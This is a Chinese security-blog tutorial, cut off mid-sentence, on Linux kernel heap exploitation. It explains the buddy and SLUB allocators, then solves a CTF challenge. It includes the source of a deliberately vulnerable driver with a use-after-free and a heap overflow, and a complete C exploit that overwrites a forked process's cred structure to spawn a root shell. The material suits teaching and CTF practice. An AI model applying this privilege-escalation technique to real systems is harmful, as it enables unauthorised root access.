---
title: Linux kernel 堆溢出利用方法
url: https://www.secpulse.com/archives/205531.html
source: 安全脉搏
date: 2024-12-18
fetch_date: 2025-10-06T19:38:10.317368
---

# Linux kernel 堆溢出利用方法

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# Linux kernel 堆溢出利用方法

[漏洞](https://www.secpulse.com/archives/category/vul)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2024-12-17

8,831

# 前言

本文还是用一道例题来讲解几种内核堆利用方法，内核堆利用手段比较多，可能会分三期左右写。进行内核堆利用前，可以先了解一下内核堆的基本概念，当然更好去找一些详细的内核堆的基础知识。

## 概述

`Linux kernel` 将内存分为 `页（page）→区（zone）→节点（node）` 三级结构，主要有两个内存管理器—— `buddy system` 与 `slub allocator`，前者负责以内存页为粒度管理所有可用的物理内存，后者则以`slab`分配器为基础向前者请求内存页并划分为多个较小的对象（object）以进行细粒度的内存管理。

![page-zone-node](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410181628453.png)

## budy system

`buddy system` 以 `page` 为粒度管理着所有的物理内存，在每个 `zone` 结构体中都有一个 `free_area` 结构体数组，用以存储 `buddy system` 按照 `order` 管理的页面:

* 分配：

+ 首先会将请求的内存大小向 2 的幂次方张内存页大小对齐，之后从对应的下标取出连续内存页。
+ 若对应下标链表为空，则会从下一个 order 中取出内存页，一分为二，装载到当前下标对应链表中，之后再返还给上层调用，若下一个 order 也为空则会继续向更高的 order 进行该请求过程。

* 释放：

+ 将对应的连续内存页释放到对应的链表上。
+ 检索是否有可以合并的内存页，若有，则进行合成，放入更高 order 的链表中。

![zone_struct](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410181628454.png)

## slub allocator

`slub_allocator` 是基于 `slab_alloctor` 的分配器。`slab allocator` 向 `buddy system` 请求单张或多张连续内存页后再分割成同等大小的 `object` 返还给上层调用者来实现更为细粒度的内存管理。

* 分配：

+ 首先从 `kmem_cache_cpu` 上取对象，若有则直接返回。
+ 若 `kmem_cache_cpu` 上的 `slub` 已经无空闲对象了，对应 `slub` 会被从 `kmem_cache_cpu` 上取下，并尝试从 `partial` 链表上取一个 `slub` 挂载到 `kmem_cache_cpu` 上，然后再取出空闲对象返回。
+ 若 `kmem_cache_node` 的 `partial` 链表也空了，那就向 `buddy system` 请求分配新的内存页，划分为多个 `object` 之后再给到 `kmem_cache_cpu`，取空闲对象返回上层调用。

* 释放：

+ 若被释放 `object` 属于 `kmem_cache_cpu` 的 `slub`，直接使用头插法插入当前 `CPU slub` 的 `freelist`。
+ 若被释放 `object` 属于 `kmem_cache_node` 的 `partial` 链表上的 `slub`，直接使用头插法插入对应 `slub` 的 `freelist`。
+ 若被释放 `object` 为 `full slub`，则其会成为对应 `slub` 的 `freelist` 头节点，且该 `slub` 会被放置到 `partial` 链表。

![slub_allocator](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202410181628455.png)

# heap\_bof

## 题目分析

题目给了源码，存在`UAF`和`heap overflow`两种漏洞。内核版本为`4.4.27`

```
#include <asm/uaccess.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/types.h>

struct class *bof_class;
struct cdev cdev;

int bof_major = 256;
char *ptr[40];// 指针数组，用于存放分配的指针
struct param {
    size_t len;       // 内容长度
    char *buf;        // 用户态缓冲区地址
    unsigned long idx;// 表示 ptr 数组的 索引
};

long bof_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
    struct param p_arg;
    copy_from_user(&p_arg, (void *) arg, sizeof(struct param));
    long retval = 0;
    switch (cmd) {
        case 9:
            copy_to_user(p_arg.buf, ptr[p_arg.idx], p_arg.len);
            printk("copy_to_user: 0x%lx\n", *(long *) ptr[p_arg.idx]);
            break;
        case 8:
            copy_from_user(ptr[p_arg.idx], p_arg.buf, p_arg.len);
            break;
        case 7:
            kfree(ptr[p_arg.idx]);
            printk("free: 0x%p\n", ptr[p_arg.idx]);
            break;
        case 5:
            ptr[p_arg.idx] = kmalloc(p_arg.len, GFP_KERNEL);
            printk("alloc: 0x%p, size: %2lx\n", ptr[p_arg.idx], p_arg.len);
            break;
        default:
            retval = -1;
            break;
    }
    return retval;
}

static const struct file_operations bof_fops = {
        .owner = THIS_MODULE,
        .unlocked_ioctl = bof_ioctl,//linux 2.6.36内核之后unlocked_ioctl取代ioctl
};

static int bof_init(void) {
    //设备号
    dev_t devno = MKDEV(bof_major, 0);
    int result;
    if (bof_major)//静态分配设备号
        result = register_chrdev_region(devno, 1, "bof");
    else {//动态分配设备号
        result = alloc_chrdev_region(&devno, 0, 1, "bof");
        bof_major = MAJOR(devno);
    }
    printk("bof_major /dev/bof: %d\n", bof_major);
    if (result < 0) return result;
    bof_class = class_create(THIS_MODULE, "bof");
    device_create(bof_class, NULL, devno, NULL, "bof");
    cdev_init(&cdev, &bof_fops);
    cdev.owner = THIS_MODULE;
    cdev_add(&cdev, devno, 1);
    return 0;
}

static void bof_exit(void) {
    cdev_del(&cdev);
    device_destroy(bof_class, MKDEV(bof_major, 0));
    class_destroy(bof_class);
    unregister_chrdev_region(MKDEV(bof_major, 0), 1);
    printk("bof exit success\n");
}

MODULE_AUTHOR("exp_ttt");
MODULE_LICENSE("GPL");
module_init(bof_init);
module_exit(bof_exit);
```

**boot.sh**

这道题是多核多线程。并且开启了`smep`和`smap`。

```
#!/bin/bash

qemu-system-x86_64 \
  -initrd rootfs.cpio \
  -kernel bzImage \
  -m 512M \
  -nographic \
  -append 'console=ttyS0 root=/dev/ram oops=panic panic=1 quiet kaslr' \
  -monitor /dev/null \
  -smp cores=2,threads=2 \
  -cpu kvm64,+smep,+smap \
```

# kernel Use After Free

## 利用思路

`cred` 结构体大小为 `0xa8` ，根据 `slub` 分配机制，如果申请和释放大小为 `0xa8`（实际为 `0xc0` ）的内存块，此时再开一个线程，则该线程的 `cred` 结构题正是刚才释放掉的内存块。利用 `UAF` 漏洞修改 `cred` 就可以实现提权。

## exp

```
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/wait.h>

#define BOF_MALLOC 5
#define BOF_FREE 7
#define BOF_EDIT 8
#define BOF_READ 9

struct param {
    size_t len;       // 内容长度
    char *buf;        // 用户态缓冲区地址
    unsigned long idx;// 表示 ptr 数组的 索引
};

int main() {
    int fd = open("dev/bof", O_RDWR);
    struct param p = {0xa8, malloc(0xa8), 1};
    ioctl(fd, BOF_MALLOC, &p);
    ioctl(fd, BOF_FREE, &p);
    int pid = fork(); // 这个线程申请的cred结构体obj即为刚才释放的obj。
    if (pid < 0) {
        puts("[-]fork error");
        return -1;
    }
    if (pid == 0) {
        p.buf = malloc(p.len = 0x30);
        memset(p.buf, 0, p.len);
        ioctl(fd, BOF_EDIT, &p); // 修改用户ID
        if (getuid() == 0) {
            puts("[+]root success");
            system("/bin/sh");
        } else {
            puts("[-]root failed");
        }
    } else {
        wait(NULL);
    }
    close(fd);
    return 0;
}
```

但是此种方...